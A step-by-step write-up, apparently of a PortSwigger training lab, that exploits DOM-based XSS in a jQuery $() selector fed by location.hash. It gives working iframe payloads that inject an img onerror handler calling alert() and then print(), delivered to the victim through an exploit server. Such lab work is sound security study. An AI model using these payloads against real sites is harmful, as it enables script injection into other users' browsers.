# Lab: DOM XSS in jQuery selector sink using a hashchange event

 This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 

# Step 1 Find a Source for DOM XSS

I find a script with a hashchange event on the main page:

![image](https://user-images.githubusercontent.com/83407557/211337326-97c4d921-f7a2-4904-b446-0f614aa504a6.png)


This means that on the homepage a hashtag followed by a blog post's title will autoscroll to that blogpost on the page:

![image](https://user-images.githubusercontent.com/83407557/211340961-c2064240-ef27-4015-95b2-a356d14885e6.png)

![image](https://user-images.githubusercontent.com/83407557/211341086-644d245f-069a-4466-bd99-153ecd8ed29a.png)

# Step 2 Create an iframe on attack server that causes XSS

The example iframe from port swigger is as follows:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

To create a POC that targets this webapp I modify it:

```html
<iframe src="https://0a7d0043037d5182c1ecd113006300cc.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

# Step 3 Create a page to deliver the exploit on attack server

I put this iframe POC on the body of /exploit using the provided attack-server:

![image](https://user-images.githubusercontent.com/83407557/211341937-2f8c2be3-b8a5-4adf-9500-00042dc3cd92.png)

When I view the exploit, the iframe causes the XSS to trigger and gives an alert:

![image](https://user-images.githubusercontent.com/83407557/211342148-ded53605-802c-400e-a8b4-b088c822bb3f.png)

# Step 4 Modify POC to call a print() function

Since I need the exploit to call a print function instead of an alert, I change the exploit and save it again:

```html
<iframe src="https://0a7d0043037d5182c1ecd113006300cc.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```

![image](https://user-images.githubusercontent.com/83407557/211343880-9fd26b2f-c392-4ed6-9bc6-a6f138dedde6.png)


![image](https://user-images.githubusercontent.com/83407557/211343588-6f332836-74b9-4625-b143-c9050a18a0a4.png)

# Step 5 Deliver exploit to victim

I deliver the exploit to victim:

![image](https://user-images.githubusercontent.com/83407557/211344034-a394def8-6322-4ef0-8217-bcc4c059dfc5.png)

Which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/211344091-8ba86f4a-358c-40d6-8ab8-1f49423d2b17.png)

